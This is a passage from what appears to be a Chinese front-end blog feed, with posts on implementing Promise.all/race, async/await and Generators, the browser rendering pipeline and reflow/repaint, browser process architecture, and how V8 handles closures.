class="number">0</span></span><br><span class="line">  <span class="keyword">let</span> result = []</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    promiseArr.forEach(<span class="function">(<span class="params">p, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// Promise.resolve(p)用于处理传入只不为promise的情况</span></span><br><span class="line">      MyPromise.resolve(p).then(</span><br><span class="line">        val =&gt; &#123;</span><br><span class="line">          index++</span><br><span class="line">          result[i] = val</span><br><span class="line">          <span class="keyword">if</span> (index === promiseArr.length) &#123;</span><br><span class="line">            resolve(result)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        err =&gt; &#123;</span><br><span class="line">          reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.race()<br>一旦某个promise resolve或reject，返回的promise就会resolve或reject</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> race () &#123;</span><br><span class="line">  <span class="keyword">return</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    MyPromise.resolve(p).then(</span><br><span class="line">      value =&gt; &#123; resolve(value )&#125;,</span><br><span class="line">      err =&gt; &#123; reject(err) &#125;</span><br><span class="line">    )</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-async-await"><a href="#2-async-await" class="headerlink" title="2. async/await"></a>2. async/await</h3><p>提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力，并且使得代码逻辑更加清晰，而且还支持 try-catch 来捕获异常，非常符合人的线性思维。</p><h4 id="2-1-async-await解决了什么问题"><a href="#2-1-async-await解决了什么问题" class="headerlink" title="2.1  async/await解决了什么问题"></a>2.1  async/await解决了什么问题</h4><ul><li>过多的链式调用可读性依然不佳</li><li>流程控制不方便<br>异步任务a-&gt;b-&gt;c之间存在依赖关系，如果我们通过then链式调用来处理这些关系，可读性并不是很好，如果我们想控制某些条件下，b不往下执行到c，那也不是很方便控制。但是如果用async/await来实现这个场景，可读性和流程控制都会方便不少。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(a)</span><br><span class="line">  .then(<span class="function"><span class="params">b</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">c</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(a);</span><br><span class="line">  <span class="keyword">const</span> b = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(b);</span><br><span class="line">  <span class="keyword">const</span> c = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(c);</span><br><span class="line">&#125;。</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-1-Generator暂停恢复执行原理"><a href="#2-1-Generator暂停恢复执行原理" class="headerlink" title="2.1  Generator暂停恢复执行原理"></a>2.1  Generator暂停恢复执行原理</h4><p>async/await实际上是对Generator（生成器）的封装，是一个语法糖，并对Generator进行了改进。</p><p>Generator 函数是一个状态机，封装了多个内部状态。执行 Generator 函数会返回一个遍历器对象，可以依次遍历 Generator 函数内部的每一个状态，但是只有调用next方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。yield表达式就是暂停标志。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">helloWorldGenerator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'hello'</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'world'</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'ending'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hw = helloWorldGenerator();</span><br><span class="line">hw.next()<span class="comment">// &#123; value: 'hello', done: false &#125;</span></span><br><span class="line">hw.next()<span class="comment">// &#123; value: 'world', done: false &#125;</span></span><br><span class="line">hw.next()<span class="comment">// &#123; value: 'ending', done: true &#125;</span></span><br><span class="line">hw.next()<span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-async-await实现原理"><a href="#2-2-async-await实现原理" class="headerlink" title="2.2 async/await实现原理"></a>2.2 async/await实现原理</h4><p>async函数对 Generator 函数的改进，体现在以下四点：</p><ul><li>内置执行器。Generator 函数的执行必须依靠执行器，而 async 函数自带执行器，无需手动执行 next() 方法。</li><li>更好的语义。async和await，比起星号和yield，语义更清楚了。async表示函数里有异步操作，await表示紧跟在后面的表达式需要等待结果。</li><li>更广的适用性。co模块约定，yield命令后面只能是 Thunk 函数或 Promise 对象，而async函数的await命令后面，可以是 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时会自动转成立即 resolved 的 Promise 对象）。</li><li>返回值是 Promise。async 函数返回值是 Promise 对象，比 Generator 函数返回的 Iterator 对象方便，可以直接使用 then() 方法进行调用。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义了一个promise，用来模拟异步请求，作用是传入参数++</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNum</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            resolve(num+<span class="number">1</span>)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自动执行器，如果一个Generator函数没有执行完，则递归调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asyncFun</span>(<span class="params">func</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> gen = func();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = gen.next(data);</span><br><span class="line">    <span class="keyword">if</span> (result.done) <span class="keyword">return</span> result.value;</span><br><span class="line">    result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">      next(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 所需要执行的Generator函数，内部的数据在执行完成一步的promise之后，再调用下一步</span></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f1 = <span class="keyword">yield</span> getNum(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> f2 = <span class="keyword">yield</span> getNum(f1);</span><br><span class="line">  <span class="built_in">console</span>.log(f2) ;</span><br><span class="line">&#125;;</span><br><span class="line">asyncFun(func);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-async-await优点"><a href="#2-3-async-await优点" class="headerlink" title="2.3 async/await优点"></a>2.3 async/await优点</h4><ul><li>做到了真正的串行同步写法</li><li>对条件语句和其他流程语句比较友好，可以直接写到判断条件里<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">await</span> a() === <span class="number">2</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-4-async-await缺点"><a href="#2-4-async-await缺点" class="headerlink" title="2.4 async/await缺点"></a>2.4 async/await缺点</h4><ul><li>async await是有传染性的 —— 当一个函数变为async后，这意味着调用他的函数也需要是async。</li><li><p>无法处理promise返回的reject对象，<code>await g()</code>会直接报错，必须用try…catch捕获</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      reject(<span class="string">'no'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> y = <span class="keyword">await</span> g()</span><br><span class="line">  <span class="built_in">console</span>.log(y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f()</span><br></pre></td></tr></table></figure></li><li><p>await只能串行，做不到并行。await一定是阻塞的，甚至可以阻塞for循环。await做不到并行，不代表async不能并行。只要await不在同一个async函数里就可以并行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.all(ajax1(), ajax2())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">'no'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 耗时20s才打印完</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> y = <span class="keyword">await</span> g()</span><br><span class="line">    <span class="built_in">console</span>.log(y)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// async实现并行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>].forEach(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> y = <span class="keyword">await</span> g()</span><br><span class="line">    <span class="built_in">console</span>.log(y)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>全局捕获错误必须用window.onerror，不像Promise可以专用window.addEventListener(‘unhandledrejection’, function)，而window.onerror会捕获各种稀奇古怪的错误，造成系统浪费</p></li><li>try..catch内部的变量无法传递个下一个try..catch</li><li>无法简单实现Promise的各种原生方法，如race()</li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/6844904096525189128" target="_blank" rel="noopener">Promise/async/Generator实现原理解析</a></li><li><a href="https://zhuanlan.zhihu.com/p/102017798" target="_blank" rel="noopener">图解 Promise 实现原理（二）—— Promise 链式调用</a></li><li><a href="https://zhuanlan.zhihu.com/p/100416432" target="_blank" rel="noopener">Promise到底解决了哪些问题？</a></li><li><a href="https://juejin.cn/post/6844903988584775693" target="_blank" rel="noopener">async/await 原理及执行顺序分析</a></li><li><a href="https://www.jianshu.com/p/0f1b6ae1888c" target="_blank" rel="noopener">async/await 原理及简单实现</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>渲染流程 + 重排重流合并</title>
      <link href="/2021/08/13/%E9%87%8D%E6%8E%92%E9%87%8D%E6%B5%81%E5%90%88%E5%B9%B6/"/>
      <url>/2021/08/13/%E9%87%8D%E6%8E%92%E9%87%8D%E6%B5%81%E5%90%88%E5%B9%B6/</url>
      <content type="html"><![CDATA[<p>输入的HTML + CSS + JS，最后输出像素，我们把这样的一个处理流程叫做渲染流水线。一个完整的渲染流水线大致可总结为如下：</p><ul><li>渲染进程将 HTML 内容转换为能够读懂的 DOM 树结构。</li><li>渲染引擎将 CSS 样式表转化为浏览器可以理解的 styleSheets，计算出 DOM 节点的样式。</li><li>创建布局树，并计算元素的布局信息。</li><li>对布局树进行分层，并生成分层树。s</li><li>为每个图层生成绘制列表，并将其提交到合成线程。</li><li>合成线程将图层分成图块，并在光栅化线程池中将图块转换成位图。</li><li>合成线程发送绘制图块命令 DrawQuad 给浏览器进程。浏览器进程根据 DrawQuad 消息生成页面，并显示到显示器上。</li></ul><p>简单概括为：构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。</p><p><br></p><h3 id="1-构建DOM树"><a href="#1-构建DOM树" class="headerlink" title="1. 构建DOM树"></a>1. 构建DOM树</h3><p>构建 DOM 树的输入内容是一个非常简单的 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM.</p><p><br></p><h3 id="2-样式计算-计算每个元素的具体样式"><a href="#2-样式计算-计算每个元素的具体样式" class="headerlink" title="2. 样式计算: 计算每个元素的具体样式"></a>2. 样式计算: 计算每个元素的具体样式</h3><p>计算出 DOM 节点中每个元素的具体样式，这个阶段大体可分为三步来完成</p><ol><li>渲染引擎会把获取到的 CSS 文本全部转换为 <code>styleSheets</code> ，该结构同时具备了查询和修改功能，为后面的样式操作提供基础。控制台中输入<code>document.styleSheets</code>可看</li></ol><p><img src="/2021/08/13/重排重流合并/1.jpg" style="width: 500px"></p><ol start="2"><li><p>转换样式表中的属性值，使其标准化<br><img src="/2021/08/13/重排重流合并/2.jpg" style="width: 500px"></p></li><li><p>计算出 DOM 树中每个节点的具体样式</p></li></ol><p><br></p><h3 id="3-创建布局树"><a href="#3-创建布局树" class="headerlink" title="3. 创建布局树"></a>3. 创建布局树</h3><p>在显示之前，我们还要额外地构建一棵只包含可见元素布局树。遍历 DOM 树中的所有可见节点，并把这些节点加到布局树中。<br><img src="/2021/08/13/重排重流合并/3.jpg" style="width: 500px"></p><p><br></p><h3 id="4-布局阶段"><a href="#4-布局阶段" class="headerlink" title="4. 布局阶段"></a>4. 布局阶段</h3><h4 id="4-1-分层"><a href="#4-1-分层" class="headerlink" title="4.1 分层"></a>4.1 分层</h4><p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了更加方便地实现这些效果，渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树。</p><p>浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面。</p><p>渲染引擎才会为特定的节点创建新的图层呢？</p><ul><li>定位属性的元素</li><li>定义透明属性的元素、</li><li>使用 CSS 滤镜的元素</li><li>z-index元素</li><li>需要裁剪的地方（出现滚动条）<br><img src="/2021/08/13/重排重流合并/4.jpg" style="width: 300px"></li></ul><p><br></p><h4 id="4-2-图层绘制"><a href="#4-2-图层绘制" class="headerlink" title="4.2 图层绘制"></a>4.2 图层绘制</h4><p>渲染引擎会把一个图层的绘制拆分成很多小的绘制指令，然后再把这些指令按照顺序组成一个待绘制列表。</p><p><br></p><h4 id="4-3-栅格化"><a href="#4-3-栅格化" class="headerlink" title="4.3 栅格化"></a>4.3 栅格化</h4><p>当图层的绘制列表准备好之后，主线程会把该绘制列表提交（commit）给合成线程。<br>合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图。</p><p><img src="/2021/08/13/重排重流合并/5.jpg" style="width: 400px"></p><p>栅格化过程都会使用 GPU 来加速生成</p><h4 id="4-4-合成与显示"><a href="#4-4-合成与显示" class="headerlink" title="4.4 合成与显示"></a>4.4 合成与显示</h4><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p><p><img src="/2021/08/13/重排重流合并/6.jpg"><br><br></p><h3 id="6-重排-更新元素的几何属性"><a href="#6-重排-更新元素的几何属性" class="headerlink" title="6. 重排 - 更新元素的几何属性"></a>6. 重排 - 更新元素的几何属性</h3><p>通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如改变元素的宽度、高度等，那么浏览器会触发重新布局，这个过程叫<em>重排</em>。重排需要更新完整的渲染流水线，所以开销也是最大的<br><img src="/2021/08/13/重排重流合并/8.jpg"></p><p><br></p><h3 id="7-重绘-更新元素的绘制属性"><a href="#7-重绘-更新元素的绘制属性" class="headerlink" title="7. 重绘 - 更新元素的绘制属性"></a>7. 重绘 - 更新元素的绘制属性</h3><p>那么布局阶段将不会被执行，因为并没有引起几何位置的变换，所以就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程就叫重绘。相较于重排操作，重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些。</p><p><img src="/2021/08/13/重排重流合并/10.jpg"></p><p><br></p><h3 id="8-直接合成阶段"><a href="#8-直接合成阶段" class="headerlink" title="8. 直接合成阶段"></a>8. 直接合成阶段</h3><p>那如果你更改一个既不要布局也不要绘制的属性。渲染引擎将跳过布局和绘制，只执行后续的合成操作，我们把这个过程叫做合成。</p><p><img src="/2021/08/13/重排重流合并/9.jpg"></p><p>我们使用了 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以相对于重绘和重排，合成能大大提升绘制效率。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="">极客时间-浏览器工作原理与实践</a></li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>浏览器工作原理与实践</title>
      <link href="/2021/08/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
      <url>/2021/08/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
      <content type="html"><![CDATA[<blockquote><ol><li>浏览器是单进程？多进程？单线程？多线程？</li><li>什么是重排，重绘，合并？</li><li>css、js会不会阻塞DOM生成？js的async, defer</li><li>为什么操作DOM很慢？解决方案<code>requestAnimationFrame</code>或虚拟滚动</li><li>为什么CSS动画比JS高效？</li><li>为什么会碰到单个页面卡死最终导致所有页面崩溃？<br>为什么会生成CSSOM树</li><li>上下文执行栈和作用域链的区别</li><li>首次加载的白屏时间</li></ol></blockquote><h3 id="进程-vs-线程"><a href="#进程-vs-线程" class="headerlink" title="进程 vs 线程"></a>进程 vs 线程</h3><p>多线程可以并行处理任务，但是线程是不能单独存在的，它是由进程来启动和管理的。<br>启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程，我们把这样的一个运行环境叫进程。</p><p>线程与进程之间的关系</p><ul><li>线程是依附于进程的，而进程中使用多线程并行处理能提升运算效率。</li></ul><ol><li>进程中的任意一线程执行出错，都会导致整个进程的崩溃。</li><li>线程之间共享进程中的数据。</li><li>当一个进程关闭之后，操作系统会回收进程所占用的内存。</li><li>进程之间的内容相互隔离。</li></ol><h3 id="1-浏览器是单进程？多进程？单线程？多线程？"><a href="#1-浏览器是单进程？多进程？单线程？多线程？" class="headerlink" title="1. 浏览器是单进程？多进程？单线程？多线程？"></a>1. 浏览器是单进程？多进程？单线程？多线程？</h3><p>单进程浏览器是指浏览器的所有功能模块都是运行在同一个进程里，这些模块包含了网络、插件、JavaScript 运行环境、渲染引擎和页面等。</p><p>打开一个页面，会有4个进程</p><ul><li>浏览器进程<br>主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。</li><li>渲染进程<br>核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下。</li><li>GPU 进程<br>其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</li><li>网络进程<br>主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。</li><li>插件进程<br>主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>V8引擎如何实现闭包？</title>
      <link href="/2021/07/31/%E9%97%AD%E5%8C%85/"/>
      <url>/2021/07/31/%E9%97%AD%E5%8C%85/</url>
      <content type="html"><![CDATA[<blockquote><p>为了解答这个问题，我们需要先了解<em>函数即对象</em>, <em>惰性解析</em>、<em>函数调用栈</em>、<em>垃圾回收</em>这些概念。当V8遇到闭包，一个本应被销毁的变量，因为还被其他地方引用，V8如何保留这个变量？这个变量会被放到哪里？</p></blockquote><p><br></p><h3 id="1-函数即对象"><a href="#1-函数即对象" class="headerlink" title="1. 函数即对象"></a>1. 函数即对象</h3><p>首先我们要理解，函数是一个可执行的对象。它既可以赋值给一个变量，也可以作为函数的参数，还可以作为函数的返回值。</p><p>我们定义一个函数<em><code>function foo() {}</code></em>，接着设置<em><code>foo.myName = 1</code></em>。从控制台输出结果，可以得知，我们既可以给<em><code>foo</code></em>添加属性，也可以实现调用<em><code>foo</code></em>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'foo'</span>)</span><br><span class="line">&#125;</span><br><span class="line">foo.myName = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.myName) <span class="comment">// 1</span></span><br><span class="line">foo() <span class="comment">// foo</span></span><br></pre></td></tr></table></figure></p><p>因为在V8内部，会为函数对象添加两个隐藏属性<em><code>name</code></em>和<em><code>code</code></em>。<em><code>name</code></em>是函数名，<em><code>code</code></em>的值是函数代码，当执行函数调用语句时，V8会从函数对象中取出<em><code>code</code></em>属性值，然后执行这段函数。</p><p><img src="/2021/07/31/闭包/2.jpg"></p><p><br></p><h3 id="2-函数调用栈-堆"><a href="#2-函数调用栈-堆" class="headerlink" title="2. 函数调用栈 + 堆"></a>2. 函数调用栈 + 堆</h3><p>定义好函数后，当我们执行这个函数时，其内部的临时变量会按照执行顺序被压入到栈中。</p><p>栈的结构和非常适合函数调用过程。在栈上分配资源和销毁资源的速度非常快，这主要归结于栈空间是连续的，分配空间和销毁空间只需要移动下指针就可以了。</p><p>虽然操作速度非常快，但是栈也是有缺点的，其中最大的缺点也是它的优点所造成的，那就是栈是连续的，所以要想在内存中分配一块连续的大空间是非常难的，</p><p>因此栈空间是有限的。因为栈空间是有限的，这就导致我们在编写程序的时候，经常一不小心就会导致栈溢出，比如函数循环嵌套层次太多，或者在栈上分配的数据过大，都会导致栈溢出，基于栈不方便存放大的数据，因此我们使用了另外一种数据结构用来保存一些大数据，这就是堆。</p><p><img src="/2021/07/31/闭包/3.jpg"></p><p><em>我们可以理解为，主线程的操作是一直是在调用栈上运作，而具体执行某个函数时，会为函数创建一个堆，函数的内部变量都会被放在堆上。</em></p><p><br></p><h3 id="3-当V8碰到闭包代码"><a href="#3-当V8碰到闭包代码" class="headerlink" title="3. 当V8碰到闭包代码"></a>3. 当V8碰到闭包代码</h3><p>我们知道了函数实际是一个可执行的对象，函数的变量会被存放在堆上。当V8碰到闭包代码时，会怎么操作？</p><h4 id="3-1-惰性解析"><a href="#3-1-惰性解析" class="headerlink" title="3.1 惰性解析"></a>3.1 惰性解析</h4><p>首先，V8不会一次性将所有的JS解析为中间代码。</p><ul><li><p>首先，如果一次解析和编译所有的 JavaScript 代码，过多的代码会增加编译时间，这会严重影响到首次执行 JavaScript 代码的速度，让用户感觉到卡顿。因为有时候一个页面的 JavaScript 代码都有 10 多兆，如果要将所有的代码一次性解析编译完成，那么会大大增加用户的等待时间；</p></li><li><p>其次，解析完成的字节码和编译之后的机器代码都会存放在内存中，如果一次性解析和编译所有 JavaScript 代码，那么这些中间代码和机器代码将会一直占用内存，特别是在手机普及的年代，内存是非常宝贵的资源。</p></li></ul><p>基于以上的原因，所有主流的 JavaScript 虚拟机都实现了<em>惰性解析</em>。所谓惰性解析是指解析器在解析的过程中，如果遇到函数声明，那么会跳过函数内部的代码，并不会为其生成 AST 和字节码，而仅仅生成顶层代码的 AST 和字节码。</p><p><br></p><h4 id="3-2-预解析器"><a href="#3-2-预解析器" class="headerlink" title="3.2 预解析器"></a>3.2 预解析器</h4><p><em>这样带来两个问题：</em></p><ul><li><em><code>foo</code></em>执行结束时，变量<em><code>d</code></em>该不该被销毁？</li><li>如果采用惰性解析，执行到<em><code>foo</code></em>函数时，V8只会解析<em><code>foo</code></em>函数，不会解析内部的<em><code>inner</code></em>函数，那么V8就不知道<em><code>inner</code></em>中引用了变量<em><code>d</code></em></li></ul><p><em>正确的处理方式应该是：</em></p><ul><li><em><code>foo</code></em>函数的执行上下文被销毁</li><li><em><code>inner</code></em>函数引用的<em><code>foo</code></em>函数中的变量<em><code>d</code></em>不能被销毁。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) 